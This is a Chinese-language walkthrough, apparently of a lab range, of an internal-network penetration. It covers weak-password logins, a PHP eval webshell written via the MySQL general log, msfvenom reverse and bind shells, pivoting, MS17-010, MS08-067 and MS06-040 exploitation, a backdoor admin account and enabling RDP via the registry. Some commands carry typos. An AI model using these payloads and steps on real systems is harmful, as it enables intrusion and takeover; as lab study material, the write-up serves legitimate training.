<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -interface=eth0 --localnet</span><br></pre></td></tr></table></figure>

<p>可以看到eth0局域网中的存活主机，这里可以看到内网中开放的web服务器主机为172.16.243.130</p>




<p>下面对目标web服务器进行信息收集，比如端口，操作系统等信息</p>
<p>使用nmap进行端口扫描和目标系统探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namp -sV -A 172.16.243.130</span><br><span class="line">-sV   扫描目标主机运行软件的版本</span><br><span class="line">-A    扫描目标主机的操作系统和版本检测，脚本扫描和路由跟踪等</span><br></pre></td></tr></table></figure>

<p>可以看到扫描出来的结果，目标主机开放80和3306端口,目标主机开放的两个端口都有可利用价值，对于3306端口的mysql服务，我们可以尝试暴力破解其用户名和密码</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805201824989.png" alt="image-20210805201824989"></p>
<p>访问目标主机的web服务,可以看到目标服务器phpstudy的web探针和php版本信息</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805202527075.png" alt="image-20210805202527075"></p>
<p>对于web探针页面，我们可以看到很多信息，服务器系统版本，web中间件的版本，主机名，管理员邮箱和web绝对根目录等敏感信息</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805202702697.png" alt="image-20210805202702697"></p>
<p>使用dirsearch和dirmap等工具对服务器进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u &quot;http://172.16.243.130&quot; -e</span><br></pre></td></tr></table></figure>





<p>服务器目录如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin     ##mysql数据库管理工具</span><br><span class="line"></span><br><span class="line">phpinfo.php     ##php版本信息</span><br><span class="line"></span><br><span class="line">1.php               </span><br><span class="line"></span><br><span class="line">beifen.rar</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="拿取目标主机shell权限"><a href="#拿取目标主机shell权限" class="headerlink" title="拿取目标主机shell权限"></a>拿取目标主机shell权限</h3><p>1.由于目标服务器存在phpmyadmin，我们访问该数据库管理后台，尝试弱口令，暴力破解等</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805210542586.png" alt="image-20210805210542586"></p>
<p>这里使用弱口令root  root登录了后台</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805210815913.png" alt="image-20210805210815913"></p>
<p>可以看到目标服务器中的数据库列表如下，值得注意的是mysql数据库中的user数据表和newyxcms数据库(这个可能是旁站cms的数据库)</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111233382.png" class title="image-20210806111233382">







<p>进入后台我们想拿到服务器shell权限，由于在之前信息收集中知道了绝对路径，所以尝试使用sql语句写入一句话木马，然后使用工具连接，拿到服务器shell权限</p>
<p>在SQL窗口执行写入一句话木马SQL语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]);?&gt;&#x27; into outfile &#x27;C:/phpstudy/www/cmd.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>但提示由于设置了secure_file_priv选项限制了文件的写入</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805211802360.png" alt="image-20210805211802360"></p>
<p>我们来看看secure_file_priv这个参数的设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure>

<p>可以看到该参数设置为NULL，表示限制啦mysql不允许导入导出，写入文件</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805213119488.png" alt="image-20210805213119488"></p>
<p>我们换个思路，对于数据库的日志记录，尝试修改日志文件为php后缀指定文件，然后将一句话木马写入该日志记录文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;      ##开启日志记录</span><br><span class="line">set global general_log_file=&#x27;C:/phpstudy/WWW/eval.php&#x27;;      ##指定日志记录文件位置为根目录下</span><br><span class="line">select &#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]); ?&gt;&#x27;;                    ##输入查询一句话语句，日志记录开启记录在指定文件中</span><br></pre></td></tr></table></figure>



<p>访问172.16.243.130&#x2F;eval.php,可以看到写入eval.php成功</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805215930898.png" alt="image-20210805215930898"></p>
<p>2.在之前对目标网站的目录进行扫描时，发现个压缩包叫做beifen.rar，下载后解压发现为yxcms文件夹，判断目标网站存在旁站，目标服务器部署了一个网站</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111905032.png" class title="image-20210806111905032">



<p>在网上搜索了一下，发现yxcms是一个企业化的建站系统,YXcms是一款基于PHP+MySql开发的网站管理系统，采用轻量级[MVC设计模式]。</p>
<p>其默认的后台页面为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://域名或ip/yxcms/index.php?r=admin</span><br></pre></td></tr></table></figure>



<p>构造url访问该网站页面:<a href="http://172.16.243.130/yscms">http://172.16.243.130/yscms</a></p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113506787.png" class title="image-20210806113506787">



<p>浏览了一下主页面，出来有个cms后台登录页面看起来有点意思，其余的没什么好东西，于是点击登录，尝试弱口令登录后台</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113733048.png" class title="image-20210806113733048">



<p>结果显示登录失败</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113851326.png" class title="image-20210806113851326">



<p>我看了看url中的r参数为member，是否通过r参数来判断一般用户和管理员登录权限，于是将r修改成admin尝试访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.243.130/yxcms/index.php?r=admin</span><br></pre></td></tr></table></figure>

<p>可以看到yxcms的管理后台，尝试使用弱口令admin 123456进行登录</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806114049007.png" class title="image-20210806114049007">



<p>成功登录后台页面，可以看到很多服务器相关信息和yxcms网站相关设置和功能</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806115148987.png" class title="image-20210806115148987">



<p>在全局设置中的前台模板中，我们可以修改模板文件，我们可以将木马代码插入其中并进行加载</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806141921572.png" class title="image-20210806141921572">





<p>通过上述的一些方法将一句话木马上传到目标web服务器中，然后使用webshell工具去连接目标路径的木马，拿到web服务器的shell和权限</p>
<p>使用weevely生成木马文件test.php,并将其上传到目标web服务器上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely generate password(密码)  test.php(生成文件名)</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144420340.png" class title="image-20210806144420340">



<p>然后去连接服务器上的test.php文件，连接建立会话成功</p>
<p>weevely  <a href="http://172.16.243.130/test.php(%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84)">http://172.16.243.130/test.php(文件路径)</a>  password(密码)</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144559145.png" class title="image-20210806144559145">



<p>接下来我们在攻击主机上利用msfvenom生成反弹shell的木马qq.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.243.128 lport=12345 -f exe &gt; qq.exe</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806151838583.png" class title="image-20210806151838583">



<p>然后我们将qq.exe通过weevely上传到目标服务器目录中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_upload /opt/tools/web/auto/metasploit/qq.exe qq.exe</span><br></pre></td></tr></table></figure>



<p>运行该木马程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_sh qq.exe</span><br></pre></td></tr></table></figure>



<p>接着打开msfconsole，开启监听模块设置参数反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole         ###打开metasploit</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler   ###设置监听模块</span><br><span class="line"></span><br><span class="line">set lhost 172.16.243.1      ##设置监听主机ip地址</span><br><span class="line"> </span><br><span class="line">set lport 12345              ###设置监听主机端口</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806153849245.png" class title="image-20210806153849245">



<p>可以看到反弹shell成功，通道建立成功</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806200708273.png" class title="image-20210806200708273">



<h3 id="目标主机信息收集"><a href="#目标主机信息收集" class="headerlink" title="目标主机信息收集"></a>目标主机信息收集</h3><p>后渗透阶段先不急着立马提权或者进行横向渗透，先对目标主机以及所在环境进行全方位的信息收集</p>
<p>主机信息收集的常用cmd命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo                  #查看详细的系统信息</span><br><span class="line">whoami                      #查看当前使用用户</span><br><span class="line">hostname                    #主机名称</span><br><span class="line">net user                    #查看主机上的用户</span><br><span class="line">net localgroup administrators     #查看系统管理员组中的用户列表</span><br><span class="line">ipconfig /all              #查看主机网络配置情况</span><br><span class="line">net share                  #查看本地开启的共享的文件夹</span><br><span class="line">netstat -ano | findstr &quot;端口号&quot;   #查看指定端口的开放情况</span><br><span class="line">wmic product  get name,version   #查询已安装的软件名称及版本情况</span><br><span class="line">cmdkey  /list              #查看3389远程端口可信任链接</span><br><span class="line">FOR /f &quot;skip=1 token=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;) do dir /a /b C:\$Recycle.Bin\%d\ ^&gt;%c.txt  #windows回收站的信息获取</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用systeminfo查看目标主机的系统信息</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203335970.png" class title="image-20210806203335970">



<p>可以看到主机的安装的修补程序，这也是需要着重观察的信息，我们可以通过该修补程序中没有的补丁来查看主机漏洞进行攻击</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203504328.png" class title="image-20210806203504328">



<p>可以看到拿到目标主机的权限是管理员权限</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806204341557.png" class title="image-20210806204341557">



<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>常用的域信息收集命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view /domain          #查看域</span><br><span class="line">net group /domain         #查询组</span><br><span class="line">net user  /domain         #查询域用户</span><br><span class="line">net group  &quot;domain admin&quot;  /domain     #查询域管理员信息</span><br><span class="line">net group  &quot;domain computers&quot;  /domain   #查询域内机器信息</span><br><span class="line">net config workstation        #查看当前计算机名，全名，用户名等信息</span><br><span class="line">net time  /domain             #查询主域服务器的时间</span><br></pre></td></tr></table></figure>

<p>上述的命令会发送到域控中查询信息，如果渗透的机器不是与用户则不是域用户权限，但是存在域</p>
<p>下面为当前计算机的相关信息，可以看到指定的域dns名称为god.org</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211120373.png" class title="image-20210806211120373">





<p>一般来说，域主机的DNS服务器指定的是域控的ip地址，我们可以使用nslookup来观察dns服务器ip地址和解析god.org的A记录ip地址。可以看到ip地址都为192.168.52.138,则可以判断域控为它</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211603738.png" class title="image-20210806211603738">



<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>这里由于反弹shell后连接的目标主机权限为管理员权限，也就省去了提权的操作。收集完目标主机的相关信息后，下面就是对处于内网的主机进行横向渗透，先对域内的主机进行渗透，然后在对域控进行渗透</p>
<h4 id="路由-x2F-端口转发"><a href="#路由-x2F-端口转发" class="headerlink" title="路由&#x2F;端口转发"></a>路由&#x2F;端口转发</h4><p>要想在处于外网的攻击主机连接处于内网域中的主机，肯定是不能直接连接的，要通过受控主机进行端口转发或者路由转发，使受控主机充当个路由转发使外网的主机能连接处于内网的主机</p>
<p><strong>1.直接利用msf添加到内网网段的路由</strong></p>
<p>msf路由相关命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run get_local_subnets            #查看本机的路由</span><br><span class="line">run autoroute  -s  192.168.52.0/24  #添加目标内网网段到路由信息中</span><br><span class="line">run autoroute  -p               #查看当前的路由设置</span><br></pre></td></tr></table></figure>

<p>可以看到当前的路由设置为到内网网段，现在就可以通过msf访问内网主机</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806212949813.png" class title="image-20210806212949813">



<p><strong>2.将内网穿透工具上传到web服务器上，然后在攻击机上进行连接指定端口</strong></p>
<p>这里使用venom工具进行内网穿透，将agent.exe使用upload命令上传到目标web服务器上，然后在攻击机上运行admin客户端程序</p>
<p>这里使用反向代理，客户端监听4444端口，让服务端来连接客户端(admin和agent都可以进行监听和连接)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 4444</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808182501466.png" class title="image-20210808182501466">



<p>在目标主机上运行agent.exe指定admin的ip地址和端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">agent.exe -rhost 172.16.243.1  -rport 4444</span><br></pre></td></tr></table></figure>





<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h4><p>下面就是对目标内网进行信息收集</p>
<p>探测内网中的存活主机，有那些域主机和域控主机</p>
<p>这里使用的是metasploit的auxiliary&#x2F;scanner&#x2F;portscan模块进行端口信息的收集，在之前的信息收集中可以发现域内出来138这台域控外还有一台域内主机，我们首先对这台域内主机进行渗透</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auiliary/scanner/portscan</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p>可以看到该台域内主机的端口开放如下:</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808214717299.png" class title="image-20210808214717299">



<p>对域控主机182.168.52.138进行端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auiliary/scanner/portscan</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810112439456.png" class title="image-20210810112439456">





<h4 id="域内主机渗透"><a href="#域内主机渗透" class="headerlink" title="域内主机渗透"></a>域内主机渗透</h4><h4 id="漏洞检测利用"><a href="#漏洞检测利用" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h4><p>目标端口的139和445端口开放，联想到ms17-010这个漏洞，尝试去验证这个漏洞是否存在</p>
<p>首先使用nmap自带的脚本进行漏洞Fuzz：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=vuln  192.168.52.141</span><br></pre></td></tr></table></figure>

<p>这里的nmap扫描并没有成功</p>
<p>尝试使用&#x2F;scanner&#x2F;smb&#x2F;ms17_010_commmand模块对目标进行扫描,发现目标可能存在ms17_010</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use  auxiliary/scanner/smb/smb_ms17has</span><br><span class="line">set rhosts 192.168.52.141</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808220259617.png" class title="image-20210808220259617">



<p>下面使用admin&#x2F;smb&#x2F;ms17_010_command模块对该主机的ms17_010判断是否为可以利用和执行的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use  admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure>

<p>可以看到目标主机执行的权限为Administrator管理员权限</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808221620326.png" class title="image-20210808221620326">



<p>接下来就是对目标主机的ms17-010进行漏洞利用拿到目标shell</p>
<p>我首先使用的是exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternablue模块的windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp的payload，但是管道并没有创建成功，由于目标内网不能连接攻击主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_enternablue</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104223573.png" class title="image-20210809104223573">



<p>接着使用了windows&#x2F;smb&#x2F;ms17_010_pspexec模块的windows&#x2F;shell&#x2F;bind_tcp的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line">set payload windows/shell/bind_tcp</span><br></pre></td></tr></table></figure>



<p>这个payload可以让目标主机开通个tcp监视器，然后让攻击主机去连接目标主机端口就可以执行shell</p>
<p>攻击成功，进入win2003的shell</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104415099.png" class title="image-20210809104415099">



<p>获取目标主机权限后，首先查看权限级别是否为管理员权限，然后考虑提权的问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>

<p>可以看到此时执行的权限为system，系统管理员权限</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104902785.png" class title="image-20210809104902785">



<p>查看目标主机的系统相关信息，特别是补丁等信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172615660.png" class title="image-20210809172615660">

<p>由于此时的荷载直接就进入cmd窗口并不能使用工具，而且该权限为管理员权限，有两条思路:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.添加新用户将其放入管理员用户组中以管理员的权限执行(添加用户原因是因为我们不知道管理员的密码无法登录)，然后开通3389(远程桌面)、22(ssh端口)等端口，通过连接前面的端口服务将生成的后台木马传入目标主机，然后使用msf等待上线。使用mimikatz、hashdump等来读内存和注册表中的密码，因为域内该主机的系统是Winserver 2008,默认存储明文密码，不需要进行sha1解密等</span><br><span class="line"></span><br><span class="line">2.寻找其他攻击载荷，直接通过msf拿到session</span><br></pre></td></tr></table></figure>



<p><strong>1.添加管理员组新用户，开通敏感服务连接上传木马</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net   user    haoyun        Yzt096877     /add                            ###添加haoyun用户</span><br><span class="line">           </span><br><span class="line">net   user   localgroup   administrators     haoyun     /add              ###添加haoyun到管理员用户组中</span><br></pre></td></tr></table></figure>



<p>开启3389远程桌面服务，要在cmd窗口开启3389端口通过修改注册表和使用内网穿透工具netsh等</p>
<p>由于这里没有办法上传netsh，只能通过在cmd修改注册表开启远程桌面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;              ###查询注册表键值</span><br><span class="line"></span><br><span class="line">reg delete &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections     ###删除注册表键值</span><br><span class="line"></span><br><span class="line">reg add     &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d   ###添加注册表键值修改FdenyTSConnections键值</span><br></pre></td></tr></table></figure>

<p>这是原来的注册表中的fDenyTSConnections 为0x1(十六进制)，当该值为1时，表示3389服务没有开启</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809142515031.png" class title="image-20210809142515031">



<p>修改目标键值后，该键值为0，如下图:</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143417396.png" class title="image-20210809143417396">

<p>可以看到3389端口开启</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143459976.png" class title="image-20210809143459976">





<p>连接远程桌面有两种方式:</p>
<p>1.返回到msf中使用rdesktop命令连接目标主机的3389端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesktop   -a  16 -r disk:share=/root/shell  192.168.52.141   -u haoyun   -p  Yzt096877</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesktop相关命令参数:</span><br><span class="line">-f 全屏</span><br><span class="line">-a 16位色</span><br><span class="line">-u xxxxxx 登录用户，可选</span><br><span class="line">-p xxxxxx 登录密码，可选</span><br><span class="line">-r clipboard:PRIMARYCLIPBOARD 重要，剪贴板可以与远程桌面交互</span><br><span class="line">-a 16 颜色，可选，不过最高就是16位</span><br><span class="line">-z 压缩，可选</span><br><span class="line">-g 1024x768 分辨率，可选，缺省是一种比当前本地桌面低的分辨率</span><br><span class="line">-P 缓冲，可选</span><br><span class="line">-r disk:wj=/home/magicgod 映射虚拟盘，可选，会在远程机器的网上邻居里虚拟出一个映射盘，功能很强，甚至可以是软盘或光盘</span><br><span class="line">-r sound:off 关闭声音，当然也可以把远程发的声音映射到本地来。</span><br></pre></td></tr></table></figure>



<p>2.通过venom工具开启个代理，使用proxychains配置代理连接</p>
<p>venom连接成功后，开启代理9999端口</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155333106.png" class title="image-20210809155333106">



<p>然后配置proxychains配置文件，设置代理ip和端口为127.0.0.1 999</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim   /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line">在配置文件最后一行修改为自己的代理端口</span><br><span class="line">socks5  127.0.0.1  9999         </span><br></pre></td></tr></table></figure>



<p>然后使用rdesktop连接内网远程桌面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains   rdesktop  192.168.52.141  -r disk:share=/root/shell</span><br></pre></td></tr></table></figure>

<p>输入账号密码后，连接成功</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155853825.png" class title="image-20210809155853825">



<p>将msfvenom生成的木马通过远程桌面传入目标主机</p>
<p>这里使用上面的反弹shell连接失败，没有返回通道(因为内网主机无法通过跳板机来连接攻击主机，而只有攻击主机才能去连接内网主机，所以反向shell不能使用)。所以使用正向连接荷载生成木马bind.exe，将其上传到win2003上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp   ARCH=x86   PLATFROM=WIN Rhost=192.168.52.141 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure>



<p>在msf上使用exploit&#x2F;multi&#x2F;handler模块的正向payload  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use  exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.52.141</span><br></pre></td></tr></table></figure>

<p>连接成功，管道打开</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809171049187.png" class title="image-20210809171049187">



<p><strong>2.使用相关荷载攻击</strong></p>
<p>通过在漏洞库中搜索win2003相关的漏洞</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172910901.png" class title="image-20210809172910901">



<p>这里尝试ms08-067和ms06_040进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta</span><br></pre></td></tr></table></figure>



<p><strong>2.1 ms08-067漏洞利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms08-067          ###搜索相关模块</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/bind_tcp    ###使用正向shell荷载</span><br><span class="line"></span><br><span class="line">set rhost 192.168.52.1141           ###设置目标主机Ip地址</span><br></pre></td></tr></table></figure>

<p>攻击成功，管道打开</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809173703941.png" class title="image-20210809173703941">



<p><strong>2.2 ms06-040漏洞利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search  ms06-040</span><br><span class="line"></span><br><span class="line">use  exploit/windows/smb/ms06_040_netapi</span><br><span class="line"></span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhost    192.168.52.141</span><br><span class="line"></span><br><span class="line">set target  5</span><br></pre></td></tr></table></figure>

<p>漏洞利用成功，攻击成功，管道打开</p>
<img src="/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809174522308.png" class title="image-20210809174522308">



<p><strong>2.3 ms03-026漏洞利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞实质上影响的是使用RPC的DCOM接口，此接口处理由客户端机器发送给服务器的DCOM对象激活请求(如UNC路径)。攻击者通过向目标发送畸形  RPC  DCOM请求来利用这些漏洞。成功利用此漏洞可以以本地系统权限执行任意指令。攻击者可以在系统上执行任意操作 ，如安装程序、查看或更改、删除数据或创建系统管理员权限的帐户</span><br></pre></td></tr></table></figure>

